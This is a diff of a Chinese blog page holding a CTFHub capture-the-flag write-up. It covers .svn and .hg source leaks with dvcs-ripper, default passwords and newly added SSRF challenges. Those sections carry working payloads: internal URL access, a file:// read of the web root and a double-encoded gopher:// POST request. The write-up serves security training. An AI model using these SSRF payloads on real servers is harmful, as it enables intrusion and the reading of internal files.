@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      638 字
+      1.1k 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      7
+      13
        分钟
     </span>
   
@@ -250,8 +250,41 @@
 <ul>
 <li>安装 ：<code>sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</code>     </li>
 <li>下载：<code>git clone https://github.com/kost/dvcs-ripper</code>       </li>
-<li>进入目录—-<code>./rip-svn.pl -v -u http://challenge-05b7bb06a8d52597.sandbox.ctfhub.com:10080/.svn/</code><br><img src="https://ae02.alicdn.com/kf/H29c34143c01d4d5d8e779d0e2486633bO.jpg" srcset="/img/loading.gif" alt="302.png"><br>svn1.7及以后版本则只在项目根目录生成一个.svn文件夹，里面的pristine文件夹里包含了整个项目的所有文件备份<img src="https://sc02.alicdn.com/kf/He5b38923481e44aa991f5d9a8af4c606r.jpg" srcset="/img/loading.gif" alt="303.png">     <h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。<br>使用<code>dvcs-ripper</code>里的<code>rip-hg.pl</code>获取<code>.hg</code><br><img src="https://ae03.alicdn.com/kf/H8d9f7059f12149038acda9a79def182fz.jpg" srcset="/img/loading.gif" alt="304.png"><br>进入<code>.hg/</code><img src="https://ae04.alicdn.com/kf/H20378cb9f63b45fb87a76966b69ee5b82.jpg" srcset="/img/loading.gif" alt="305.png"><br>网页访问得到flag     <h2 id="密码口令"><a href="#密码口令" class="headerlink" title="密码口令"></a>密码口令</h2><h3 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h3><img src="https://ae04.alicdn.com/kf/H1008cfe9ce7444b3941d6673d77452d1T.jpg" srcset="/img/loading.gif" alt="401.png"><br>百度搜索:<code>常见设备默认口令</code><br>找到亿邮邮件网关的默认用户名和密码—登录<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40399254/article/details/106469069">常见设备默认口令</a></li>
+<li>进入目录—-<code>./rip-svn.pl -v -u http://challenge-05b7bb06a8d52597.sandbox.ctfhub.com:10080/.svn/</code><br><img src="https://ae02.alicdn.com/kf/H29c34143c01d4d5d8e779d0e2486633bO.jpg" srcset="/img/loading.gif" alt="302.png"><br>svn1.7及以后版本则只在项目根目录生成一个.svn文件夹，里面的pristine文件夹里包含了整个项目的所有文件备份<img src="https://sc02.alicdn.com/kf/He5b38923481e44aa991f5d9a8af4c606r.jpg" srcset="/img/loading.gif" alt="303.png">     <h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。<br>使用<code>dvcs-ripper</code>里的<code>rip-hg.pl</code>获取<code>.hg</code><br><img src="https://ae03.alicdn.com/kf/H8d9f7059f12149038acda9a79def182fz.jpg" srcset="/img/loading.gif" alt="304.png"><br>进入<code>.hg/</code><img src="https://ae04.alicdn.com/kf/H20378cb9f63b45fb87a76966b69ee5b82.jpg" srcset="/img/loading.gif" alt="305.png"><br>网页访问得到flag     <h2 id="密码口令"><a href="#密码口令" class="headerlink" title="密码口令"></a>密码口令</h2><h3 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h3><img src="https://ae04.alicdn.com/kf/H1008cfe9ce7444b3941d6673d77452d1T.jpg" srcset="/img/loading.gif" alt="401.png"><br>百度搜索:<code>常见设备默认口令</code><br>找到亿邮邮件网关的默认用户名和密码—登录<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40399254/article/details/106469069">常见设备默认口令</a><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3></li>
 </ul>
+<p>来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦          </p>
+<p><img src="https://ae02.alicdn.com/kf/U9aac43ac8c544d01963111fc9be06a91h.jpg" srcset="/img/loading.gif" alt="501.png"><br>题目是端口扫描，给了范围，可以用burp爆破<br>抓包<br>在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况<br><img src="https://ae04.alicdn.com/kf/Udb8ff8141f11458f8592a495df9dae77Y.jpg" srcset="/img/loading.gif" alt="502.png"><br>设置<br><img src="https://ae03.alicdn.com/kf/U237150ace53d40ad8b149c0880bd075bc.jpg" srcset="/img/loading.gif" alt="503.png"><br>结果<br><img src="https://ae02.alicdn.com/kf/U2ff238abbe8f47c3906bce8991367077Q.jpg" srcset="/img/loading.gif" alt="504.png"><br>访问得到flag      </p>
+<h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>尝试访问位于127.0.0.1的flag.php吧         </p>
+<p>payload：<code>url=127.0.0.1/flag.php</code>       </p>
+<h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><p>尝试去读取一下Web目录下的flag.php吧        </p>
+<p>题目说是web目录，用file伪协议即可<br>payload：<code>url=file:///var/www/html/flag.php</code><br>web目录要记住          </p>
+<h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>看wp说能扫出<code>index.php</code>和<code>flag.php</code>的，但我没扫出来<br>直接访问吧<br><code>/flag.php</code>——-&gt;Just View From 127.0.0.1<br>那么<code>?url=127.0.0.1/flag.php</code><img src="https://sc03.alicdn.com/kf/U16e6dcbec9894950bdd8eadca49482ecL.jpg" srcset="/img/loading.gif" alt="505.png"><br>可以用file协议读取<code>flag.php</code>        </p>
+<pre><code>&lt;?php
+
+error_reporting(0);
+
+if ($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;) &#123;
+    echo &quot;Just View From 127.0.0.1&quot;;
+    return;
+&#125;
+
+$flag=getenv(&quot;CTFHUB&quot;);
+$key = md5($flag);
+
+if (isset($_POST[&quot;key&quot;]) &amp;&amp; $_POST[&quot;key&quot;] == $key) &#123;
+    echo $flag;
+    exit;
+&#125;
+?&gt;</code></pre>
+<p>没有提交按钮，可以用gopher协议构造post请求       </p>
+<pre><code>POST /flag.php HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 36
+
+key=308353d55f15e345a78047c613994fcb         </code></pre>
+<p>将其进行url编码，<br>然后加上<code>gopher://127.0.0.1:80/_</code><br>再次url编码<br>提交得到flag<br>payload：<code>?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D308353d55f15e345a78047c613994fcb</code></p>
+<h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>这个和上面那个差不多，也要用gopher协议<br>访问flag.php后有上传文件，但没提交按钮<br>可以自己构造一个<code>&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</code><br>提交抓包<br>Host改为<code>127.0.0.1</code><br>过一下上面的编码流程<br>提交       </p>
 
             </div>
             <hr>
